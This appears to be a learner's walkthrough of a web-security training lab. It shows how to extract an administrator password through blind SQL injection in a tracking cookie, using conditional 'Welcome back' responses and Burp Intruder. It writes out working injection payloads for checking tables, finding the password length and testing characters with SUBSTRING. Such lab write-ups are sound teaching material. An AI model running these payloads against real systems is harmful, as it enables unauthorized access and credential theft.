## Lab: Blind SQL injection with conditional responses.

- This lab contains a blind SQL injection vulnerability.
- The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
- The results of the SQL query are not returned, and no error messages are displayed.
- But the application includes a *"Welcome back"* message in the page if the query returns any rows.
- The database contains a different table called users, with columns called username and password. 
- You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

# To solve the lab, log in as the administrator user.

# Visit the front page and use Burp Suite to intercept and modify the request containing the TrackingId.
```Cookie: TrackingId=abcdefgh;```

# Modify the `TrackingId` , changing it to:
```Cookie: TrackingId=abc' AND '1'='1;```
- this will display welcome back message

```Cookie: TrackingId=abc' AND '1'='2;```
- "Welcome back" message does not appear in the response.

# now change payload to this:
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
- Verify that the condition is true, confirming that there is a table called `users`.
- If we change the value here then it doesnot display welcome back messege.

# Now again change payload that will confirm there is a user called `administrator`.
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
- If there is a administrator user then welcome back is shown otherwise  wecome back will not appear.

# Now we need to determine how many characters are in the password of the administrator user.for this
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
- condition is true, confirming that the password is greater than 1 character in length.

# Send a series of follow-up values to test different password lengths.
- Use burp repeater to check other wise it takes more time.
- welcome back messege  will appears until the condition is false.
-  found the length of the password, which is in fact 20 characters long.

# the next step is to test the character at each position to determine its value.
- This involves a much larger number of requests, so you need to use Burp Intruder.
- use the bellow payload for this :
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
- This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value.
- Place payload position markers around the final a character in the cookie value.
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```
- To test the character at each position  assume that the password contains only lowercase alphanumeric characters.
- Go to the `Payloads tab`, check that "Simple list" is selected, and under Payload settings add the payloads in the range a - z and 0 -9.You can select these easily using the "Add from list" drop-down.
- To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back".
- To do this, go to the Settings tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
- Launch attack.

# Now simply  re-run the attack for each of the other character positions in the password, to determine their value. 
- To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
```TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a```

## I used cluster bomb in payload and run multiple payload set this will get password fast.

## after getting password login as a administrator
```
administrator

```


## lab solved